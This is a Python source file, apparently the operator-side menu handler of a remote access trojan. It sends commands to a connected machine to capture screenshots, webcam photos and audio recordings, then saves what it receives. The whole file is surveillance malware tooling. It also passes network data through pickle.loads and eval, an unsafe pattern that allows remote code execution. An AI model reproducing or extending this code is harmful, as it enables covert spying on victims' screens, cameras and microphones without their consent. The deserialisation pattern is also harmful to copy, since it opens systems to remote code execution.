import threading
import pickle
from base64 import b64encode, b64decode
from CommunicationHacker import CommunicationHacker


class MenuHandlerHacker(threading.Thread):
	def __init__(self, connection, logger):
		super(MenuHandlerHacker, self).__init__()

		self.is_running = False
		self.logger = logger

		if isinstance(connection, CommunicationHacker):
			self.connection = connection
		else:
			raise TypeError("\'connection\' parameter should be \'CommunicationHacker\' type!")


	def stop(self):
		self.is_running = False


	def run(self):
		self.is_running = True
		print("1) Take screenshot\n2) Webcam picture\n3) Record audio\n4) Exit\n")

		while self.is_running:
			option = str(input(">>> "))

			# requests
			if option.lower() == 'help':
				print("1) Take screenshot\n2) Webcam picture\n3) Record audio\n4) Exit\n")
			elif option == '1':
				self.logger.info('Taking screenshot...')
				try:
					option = b64encode(option.encode())
					option = pickle.dumps(option)
					self.connection.socket_interact.send(option)
					option = pickle.loads(option)
					option = b64decode(option).decode()
				except Exception:
					break
			elif option == '2':
				self.logger.info('Taking webcam picture...')
				try:
					option = b64encode(option.encode())
					option = pickle.dumps(option)
					self.connection.socket_interact.send(option)
					option = pickle.loads(option)
					option = b64decode(option).decode()
				except Exception:
					break
			elif option == '3':
				self.logger.info('Recording audio...')
				try:
					option = b64encode(option.encode())
					option = pickle.dumps(option)
					self.connection.socket_interact.send(option)
					option = pickle.loads(option)
					option = b64decode(option).decode()
				except Exception:
					break
			elif option == '4':
				self.logger.info("Closing the connection...")
				option = b64encode(option.encode())
				option = pickle.dumps(option)
				self.connection.socket_interact.send(option)
				break
			elif option == '':
				pass
			else:
				print("Wrong option!\n")

			# replies
			if option in ['1', '2', '3']:
				data = self.connection.socket_interact.recv()
				data = pickle.loads(data)
				data = b64decode(data).decode()
				data = eval(data)

				if data[0] == "image":
					if data[2] == 'Error':
						self.logger.info("Error while taking screenshot!")
					else:
						with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
							handler.write(data[2])
						self.logger.info('Done')
				elif data[0] == "wcpic":
					if data[2] == 'Error':
						self.logger.info("Error while taking webcam picture!")
					else:
						with open(f'./webcam_{data[1]}.png', 'wb') as handler:
							handler.write(data[2])
						self.logger.info('Done')
				elif data[0] == 'audio':
					if data[2] == 'Error':
						self.logger.info("Error while recording audio!")
					else:
						with open(f'./audio_{data[1]}.wav', 'wb') as handler:
							handler.write(data[2])
						self.logger.info('Done')